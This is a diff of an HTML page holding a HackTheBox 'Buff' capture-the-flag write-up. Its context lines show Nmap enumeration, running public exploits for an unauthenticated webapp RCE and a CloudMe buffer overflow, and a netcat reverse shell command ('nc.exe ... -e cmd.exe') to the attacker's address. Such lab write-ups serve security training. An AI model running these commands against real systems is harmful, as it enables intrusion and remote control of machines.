@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20200810_vulnhub-infosecpreposcp.html"> « </a>📅 published on <code>24/Nov/2020</code></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for HackTheBox VM <a href="https://www.hackthebox.eu/home/machines/profile/263">Buff</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_buff/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_buff/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>8080/tcp/http/Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_gymsystem_rce">exploit_gymsystem_rce</a>, <a href="https://github.com/7h3rAm/writeups#exploit_cloudme_bof">exploit_cloudme_bof</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.80 scan initiated Wed Jul 22 21:04:22 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/xml/_quick_tcp_nmap.xml 10.10.10.198
 Nmap scan report for 10.10.10.198
@@ -92,7 +92,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
 <pre class="nested"><code>8080/tcp   http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We use <code>searchsploit</code> to find exploits for the webapp and find an unauthenticated remote code execution vulnerability. We inspect the exploit and upon executing it, we get a pseudo-interactive shell on the target machine:  </p>
 <pre class="nested"><code>python 48506.py http://10.10.10.198:8080/
 </code></pre>
@@ -110,7 +110,7 @@ C:\Users\shaun\Desktop\nc.exe 10.10.14.8 4433 -e cmd.exe
 <pre class="nested"><code>type C:\Users\shaun\Desktop\user.txt
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_buff/screenshot07.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>buff\shaun@BUFF&gt; id
 buff\shaun
 buff\shaun@BUFF&gt;  
@@ -138,7 +138,7 @@ buff\shaun@BUFF&gt; users
 Administrator
 shaun
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We use <code>winPEAS.exe</code> to enumerate the target machine and within the <code>services restricted from the outside</code> section, find an interesting service bound to <code>127.0.0.1:8888</code>:  </p>
 <pre class="nested"><code>netstat -anp tcp
 </code></pre>
@@ -171,7 +171,7 @@ python 48389.py
 <pre class="nested"><code>type C:\Users\Administrator\Desktop\root.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_htb_buff/screenshot15.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/263">https://www.hackthebox.eu/home/machines/profile/263</a>  </li>
 </ul>
